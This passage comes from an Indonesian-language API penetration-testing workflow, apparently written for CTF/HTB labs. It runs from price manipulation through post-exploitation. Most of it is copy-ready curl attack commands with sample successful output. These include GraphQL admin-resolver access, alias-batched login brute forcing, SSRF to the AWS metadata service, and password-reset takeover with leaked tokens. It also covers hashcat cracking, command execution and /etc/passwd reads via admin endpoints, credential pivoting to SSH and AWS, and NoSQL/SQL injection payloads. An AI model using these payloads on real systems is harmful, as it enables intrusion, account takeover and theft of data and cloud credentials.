# Test apakah server trust client-supplied price
curl -si -X POST "$TARGET/api/v1/cart/checkout" \
    -H "Authorization: Bearer $TOKEN_A" \
    -H "Content-Type: application/json" \
    --data '{
        "items": [
            {"product_id": 1, "quantity": 1, "price": 0.01}
        ]
    }' | tee ~/api_loot/evidence/price_manip.txt

# Test negative quantity
curl -si -X POST "$TARGET/api/v1/cart" \
    -H "Authorization: Bearer $TOKEN_A" \
    -H "Content-Type: application/json" \
    --data '{"product_id":1,"quantity":-1}'

# Test zero quantity
curl -si -X POST "$TARGET/api/v1/cart" \
    -H "Authorization: Bearer $TOKEN_A" \
    -H "Content-Type: application/json" \
    --data '{"product_id":1,"quantity":0}'
```

**OUTPUT BERHASIL ✅ — Price manipulation bekerja:**

JSON

```
{"order_id":999,"total":0.01,"status":"completed"}
```

➡️ **CRITICAL! Server trust client-supplied price!**

---

## ═══════════════════════════════════════

## FASE 7: GRAPHQL EXPLOITATION

## ═══════════════════════════════════════

### Langkah 7.1 — GraphQL Authorization Testing

Bash

```
# Test apakah semua resolver enforce authorization
# Dari schema yang didapat di Fase 0G, test setiap query/mutation

# Test dengan user biasa mengakses admin resolver
curl -si -X POST "$TARGET/graphql" \
    -H "Authorization: Bearer $TOKEN_A" \
    -H "Content-Type: application/json" \
    --data '{"query":"{ adminUsers { id username role password_hash } }"}'

# Test mutation yang seharusnya hanya admin
curl -si -X POST "$TARGET/graphql" \
    -H "Authorization: Bearer $TOKEN_A" \
    -H "Content-Type: application/json" \
    --data '{"query":"mutation { deleteUser(id:1) { success } }"}'
```

**OUTPUT BERHASIL ✅ — GraphQL BFLA:**

JSON

```
{"data":{"adminUsers":[{"id":1,"username":"admin","role":"admin","password_hash":"$2b$12$..."}]}}
```

➡️ **BFLA via GraphQL! Password hash exposed!**

Bash

```
# Crack password hash
echo '$2b$12$...' | tee ~/api_loot/tokens/admin_hash.txt
hashcat -m 3200 ~/api_loot/tokens/admin_hash.txt \
    /usr/share/wordlists/rockyou.txt --force
```

---

### Langkah 7.2 — GraphQL Alias untuk Rate Limit Bypass

Bash

```
# Test apakah bisa bypass rate limit via alias batching
curl -si -X POST "$TARGET/graphql" \
    -H "Content-Type: application/json" \
    --data '{
        "query": "{ a:login(username:\"admin\",password:\"password1\") b:login(username:\"admin\",password:\"password2\") c:login(username:\"admin\",password:\"password3\") d:login(username:\"admin\",password:\"admin\") }"
    }' | python3 -m json.tool
```

**OUTPUT BERHASIL ✅ — Multiple login attempts in one request:**

JSON

```
{
  "data": {
    "a": null,
    "b": null,
    "c": null,
    "d": {"token": "eyJhbGc..."}
  }
}
```

➡️ **Rate limit bypass via GraphQL aliases!** `d` berhasil login dengan `admin:admin`.

---

## ═══════════════════════════════════════

## FASE 8: SSRF VIA API

## ═══════════════════════════════════════

### Langkah 8.1 — Identifikasi dan Test SSRF Parameter

Bash

```
# Identifikasi parameter URL/URI
grep -E '"(url|uri|image_url|callback|webhook|fetch|endpoint|redirect|target|src)":' \
    ~/api_loot/responses/*.json 2>/dev/null

# Setup listener
python3 -m http.server 8888 &
LISTENER_PID=$!

# Test basic SSRF
curl -si -X POST "$TARGET/api/v1/fetch" \
    -H "Authorization: Bearer $TOKEN_A" \
    -H "Content-Type: application/json" \
    --data "{\"url\":\"http://$LHOST:8888/ssrf-test\"}"

# Test internal SSRF
curl -si -X POST "$TARGET/api/v1/fetch" \
    -H "Authorization: Bearer $TOKEN_A" \
    -H "Content-Type: application/json" \
    --data '{"url":"http://127.0.0.1:80/"}'

curl -si -X POST "$TARGET/api/v1/fetch" \
    -H "Authorization: Bearer $TOKEN_A" \
    -H "Content-Type: application/json" \
    --data '{"url":"http://169.254.169.254/latest/meta-data/"}'

kill $LISTENER_PID 2>/dev/null
```

**OUTPUT BERHASIL ✅ — Listener mendapat request:**

text

```
# Di listener:
10.10.11.200 - - [GET /ssrf-test HTTP/1.1] 200
```

➡️ **SSRF confirmed!** Lanjut ke `[🌐 22 — SSRF Workflow](/docs/ssrf)` untuk full exploitation.

**OUTPUT BERHASIL ✅ — Internal SSRF:**

JSON

```
{"content":"<!DOCTYPE html><html>..."}
```

atau

JSON

```
{"content":"ami-id\nami-launch-index\n..."}
```

➡️ AWS metadata accessible! Cloud exploitation possible.

---

## ═══════════════════════════════════════

## FASE 9: EXCESSIVE DATA EXPOSURE

## ═══════════════════════════════════════

### Langkah 9.1 — Bandingkan UI vs API Response

Bash

```
# Ambil response lengkap dari berbagai endpoint dan cari data sensitif
for endpoint in users profile orders; do
    echo "=== /api/v1/$endpoint ==="
    curl -s "$TARGET/api/v1/$endpoint" \
        -H "Authorization: Bearer $TOKEN_A" | python3 -m json.tool
    echo ""
done | tee ~/api_loot/responses/all_responses.txt

# Cari field sensitif
grep -iE '"(password|hash|token|secret|key|ssn|credit|internal|private|reset|api_key)"' \
    ~/api_loot/responses/all_responses.txt
```

**OUTPUT BERHASIL ✅ — Data sensitif exposed:**

JSON

```
{
  "id": 1,
  "username": "admin",
  "email": "admin@corp.com",
  "password_hash": "$2b$12$xyz...",    ← SENSITIVE!
  "reset_token": "abc123",              ← SENSITIVE!
  "api_key": "sk-prod-xxx",             ← SENSITIVE!
  "internal_notes": "AWS creds at..."  ← SENSITIVE!
}
```

➡️ **Excessive Data Exposure!** Simpan semua credential yang ditemukan.

Bash

```
# Simpan credentials
cat > ~/api_loot/tokens/leaked_creds.txt << EOF
admin_hash: $2b$12$xyz...
reset_token: abc123
api_key: sk-prod-xxx
EOF

# Coba gunakan reset token
curl -si -X POST "$TARGET/api/v1/users/1/reset-password" \
    -H "Content-Type: application/json" \
    --data '{"token":"abc123","new_password":"hacked123!"}'
```

---

## ═══════════════════════════════════════

## FASE 10: POST-EXPLOITATION & PIVOT

## ═══════════════════════════════════════

### Setelah Dapat Admin Access — Maksimalkan Impact

Bash

```
# Jika sudah dapat admin JWT/session:
export ADMIN_TOKEN="ADMIN_JWT_OR_SESSION"

# 1. Dump semua user
curl -s "$TARGET/api/v1/admin/users" \
    -H "Authorization: Bearer $ADMIN_TOKEN" | \
    python3 -m json.tool | tee ~/api_loot/evidence/all_users.txt

# 2. Cari kredensial atau token sensitif
curl -s "$TARGET/api/v1/admin/config" \
    -H "Authorization: Bearer $ADMIN_TOKEN" | python3 -m json.tool

curl -s "$TARGET/api/v1/admin/settings" \
    -H "Authorization: Bearer $ADMIN_TOKEN" | python3 -m json.tool

# 3. Cek apakah ada command execution via API
curl -si -X POST "$TARGET/api/v1/admin/diagnostic" \
    -H "Authorization: Bearer $ADMIN_TOKEN" \
    -H "Content-Type: application/json" \
    --data '{"command":"id"}'

curl -si -X POST "$TARGET/api/v1/admin/backup" \
    -H "Authorization: Bearer $ADMIN_TOKEN" \
    -H "Content-Type: application/json" \
    --data '{"path":"/etc/passwd"}'
```

### Cross-Service Credential Testing

Setiap kali dapat credentials/token dari API, test ke service lain:

text

```
API Creds Found
     │
     ├──→ Port 22  (SSH)     → ssh user@$TARGET (creds dari API)
     ├──→ Port 80/443 (Web)  → login ke web panel
     ├──→ Port 3306 (MySQL)  → mysql -u user -p
     ├──→ Port 6379 (Redis)  → redis-cli -h $TARGET
     ├──→ Port 27017 (Mongo) → mongosh $TARGET
     ├──→ Port 5985 (WinRM)  → evil-winrm (jika Windows)
     └──→ Cloud (AWS/GCP)    → aws sts get-caller-identity
```

Bash

```
# Test credentials dari API ke SSH
ssh -o "StrictHostKeyChecking=no" user@$TARGET 2>/dev/null && echo "[+] SSH berhasil!"

# Test API key ke AWS
export AWS_ACCESS_KEY_ID="AKIA..."  # dari API response
export AWS_SECRET_ACCESS_KEY="..."
aws sts get-caller-identity 2>/dev/null && echo "[+] AWS creds valid!"
```

---

## ═══════════════════════════════════════

## TROUBLESHOOTING — SEMUA ERROR & SOLUSINYA

## ═══════════════════════════════════════

|Error|Penyebab|Solusi|
|---|---|---|
|`401 Unauthorized`|Token missing/expired|Refresh token, cek format `Bearer`|
|`403 Forbidden`|Auth ok tapi tidak authorized|Analisis sebagai authorization boundary|
|`404 Not Found`|Endpoint salah/tidak ada|Cek Swagger, JS, versi API lain|
|`405 Method Not Allowed`|Method salah|Test GET/POST/PUT/PATCH/DELETE semua|
|`429 Too Many Requests`|Rate limit terpicu|Tunggu, test dengan X-Forwarded-For|
|`415 Unsupported Media Type`|Content-Type salah|Tambah `-H "Content-Type: application/json"`|
|`Invalid JSON`|Syntax salah|Validate dengan `echo '...' \| python3 -m json.tool`|
|`JWT Expired`|Token sudah expire|Login ulang, minta token baru|
|ffuf banyak false positive|Response generic|Tambah `-fs SIZE` untuk filter|
|GraphQL introspection disabled|Production hardening|Test known queries manual|
|BOLA tidak berhasil|Object protected|Test endpoint lain, coba ID berbeda|
|SSRF tidak dapat callback|Firewall/egress block|Test internal 127.0.0.1 saja|
|Mass assignment diabaikan|Allowlist digunakan|Test variasi nama field|

---

## GOOGLE SEARCH HINTS — Ketika Buntu

text

```
# JWT bypass:
"JWT alg none bypass 2024"
site:portswigger.net "jwt authentication bypass"

# GraphQL:
"GraphQL authorization bypass resolver"
"GraphQL BOLA introspection disabled bypass"

# Mass assignment:
"mass assignment vulnerability $FRAMEWORK"
"Python Flask Django mass assignment exploit"

# API versioning:
"API versioning security bypass older version"
"OWASP API9 improper inventory management"

# Kalau endpoint tidak ketemu:
"API endpoint discovery methodology 2024"
"hidden API endpoint burp suite technique"

# Buntu total:
site:hackerone.com "$TARGET" disclosed
site:github.com "$TARGET" "api" "bug"
```

---

## ═══════════════════════════════════════

## MASTER DECISION TREE (RINGKASAN)

## ═══════════════════════════════════════

text

```
START: API Ditemukan
│
├─ FASE 0: Discovery
│   ├─ [REST] → ffuf + JS + Swagger → endpoint list
│   ├─ [GraphQL] → introspection → schema dump
│   └─ [Versi] → cek v1/v2/internal → perbedaan security
│
├─ FASE 1: Authentication
│   ├─ [No Auth] → Missing Authentication FOUND
│   ├─ [JWT] → decode → alg=none → weak secret → forge
│   └─ [API Key] → scope test → endpoint reuse
│
├─ FASE 2: BOLA
│   ├─ [User A object + User B access] → 200? → BOLA
│   └─ [ID enumeration] → ffuf IDs → bulk access
│
├─ FASE 3: BFLA
│   ├─ [Admin endpoint + normal user] → accessible? → BFLA
│   └─ [Method mismatch] → GET 403 + POST 200 → BFLA
│
├─ FASE 4: Mass Assignment
│   ├─ [Hidden fields in response] → send back in update
│   └─ [role=admin accepted] → privilege escalation
│
├─ FASE 5: Injection
│   ├─ [JSON input → SQL] → SQLi
│   ├─ [JSON input → NoSQL] → $ne bypass
│   └─ [Template field] → {{7*7}}=49 → SSTI
│
├─ FASE 6: Business Logic
│   ├─ [price in request] → price=0.01 → free item
│   ├─ [no rate limit] → brute force possible
│   └─ [old API version] → different validation
│
├─ FASE 7: GraphQL
│   ├─ [Admin resolver accessible] → BFLA
│   └─ [Alias batching] → rate limit bypass
│
└─ FASE 8-10: SSRF + Data + Post-Exploitation
    └─ [Admin access] → dump users → pivot ke service lain
```

---

## ⚡ CHEATSHEET — COPY PASTE READY

Bash

```
# === SETUP ===
export TARGET="http://api.target.htb"
export TOKEN_A="USER_A_TOKEN"
export TOKEN_B="USER_B_TOKEN"
mkdir -p ~/api_loot/{endpoints,responses,evidence,tokens}

# === DISCOVERY ===
ffuf -u "$TARGET/api/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
    -mc 200,201,401,403 -H "Authorization: Bearer $TOKEN_A"
curl -s "$TARGET/openapi.json" | jq -r '.paths | keys[]'   # swagger
curl -s "$TARGET/static/app.js" | grep -oE '"/api/[^"]*"'  # JS recon

# === AUTH TESTS ===
curl -si "$TARGET/api/v1/profile" -H "Authorization: Bearer "          # empty token
curl -si "$TARGET/api/v1/profile?is_admin=true" -H "Authorization: Bearer $TOKEN_A"
echo "$TOKEN_A" | python3 -c "import base64,json,sys; p=sys.stdin.read().strip().split('.')[1]; p+='='*(-len(p)%4); print(json.dumps(json.loads(base64.urlsafe_b64decode(p)),indent=2))"

# === BOLA ===
curl -si "$TARGET/api/v1/orders/VICTIM_ID" -H "Authorization: Bearer $TOKEN_B"
seq 1 100 | ffuf -u "$TARGET/api/v1/orders/FUZZ" -w - -H "Authorization: Bearer $TOKEN_B" -mc 200

# === BFLA ===
for M in GET POST PUT PATCH DELETE; do
    echo "=== $M ==="; curl -si -X $M "$TARGET/api/v1/admin/users" -H "Authorization: Bearer $TOKEN_A" | head -2
done

# === MASS ASSIGNMENT ===
curl -si -X PATCH "$TARGET/api/v1/profile" -H "Authorization: Bearer $TOKEN_A" \
    -H "Content-Type: application/json" --data '{"role":"admin","isAdmin":true}'

# === INJECTION ===
curl -si -X POST "$TARGET/api/v1/login" -H "Content-Type: application/json" \
    --data '{"username":"admin","password":{"$ne":null}}'                    # NoSQLi
curl -si "$TARGET/api/v1/users?id=1'" -H "Authorization: Bearer $TOKEN_A"  # SQLi

# === GRAPHQL ===
curl -s -X POST "$TARGET/graphql" -H "Content-Type: application/json" \
    --data '{"query":"{ __schema { types { name kind } } }"}' | python3 -m json.tool
curl -s -X POST "$TARGET/graphql" -H "Authorization: Bearer $TOKEN_A" \
    -H "Content-Type: application/json" \
    --data '{"query":"{ adminUsers { id username role } }"}'

# === SSRF ===
curl -si -X POST "$TARGET/api/v1/fetch" -H "Authorization: Bearer $TOKEN_A" \
    -H "Content-Type: application/json" --data '{"url":"http://169.254.169.254/latest/meta-data/"}'
```

---

> **➡️ NEXT:** Setelah API security testing selesai, jika ada HTTP smuggling indicator (proxy/CDN di depan API), lanjut ke **`[🧨 31 — HTTP Request Smuggling Workflow](/docs/http-smuggling)`**.
> 
> **⬅️ PREV:** `[🛡️ 29 — CSRF Workflow](/docs/csrf)` — CSRF dan bypass SameSite di web/API yang menggunakan cookie auth.